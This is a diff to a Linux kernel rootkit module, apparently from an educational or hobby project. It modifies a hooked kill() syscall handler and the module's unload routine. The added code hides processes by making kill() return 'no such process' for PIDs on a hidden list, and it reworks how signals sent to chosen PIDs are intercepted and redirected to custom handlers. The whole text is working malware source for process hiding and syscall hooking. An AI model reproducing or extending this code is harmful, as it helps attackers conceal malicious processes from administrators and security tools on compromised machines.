@@ -50,6 +50,9 @@ static __exit void rootkit_exit(void)
     // Restore original syscall functions
     unhook_syscalls(P_SYSCALL_HOOKS, NR_SYSCALL_HOOKS);
 
+    // Clear the list of hidden PIDs
+    show_all_processes();
+
     pr_info("[ROOTKIT] Module unloaded\n");
     return;
 }
@@ -370,14 +373,17 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
     pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);
 
     for (i = 0; i < ARRAY_SIZE(P_SIG_HANDLERS); ++i) {
-        IF_U ((P_SIG_HANDLERS[i].i32_pid < 0 || P_SIG_HANDLERS[i].i32_pid == i32_pid) &&
-              (P_SIG_HANDLERS[i].i32_sig < 0 || P_SIG_HANDLERS[i].i32_sig == i32_sig)) {
-            pr_info("[ROOTKIT] * Intercepting signal %d for PID %d\n", i32_sig, i32_pid);
-            P_SIG_HANDLERS[i].sig_handler(i32_pid, i32_sig);
-
-            // Signal was intercepted, return success
-            return 0;
+        IF_U ((P_SIG_HANDLERS[i].i32_pid == PID_ANY || P_SIG_HANDLERS[i].i32_pid == i32_pid) &&
+              (P_SIG_HANDLERS[i].i32_sig == SIG_ANY || P_SIG_HANDLERS[i].i32_sig == i32_sig)) {
+            pr_info("[ROOTKIT] * Intercepted signal %d for PID %d\n", i32_sig, i32_pid);
+            return P_SIG_HANDLERS[i].sig_handler(i32_pid, i32_sig);
         }
+    }
+
+    // Check if the process is hidden; if so, return -ESRCH (No such process)
+    IF_U (is_process_hidden(i32_pid)) {
+        pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_pid);
+        return -ESRCH;
     }
 
     // Signal was not intercepted, forward it to the original syscall
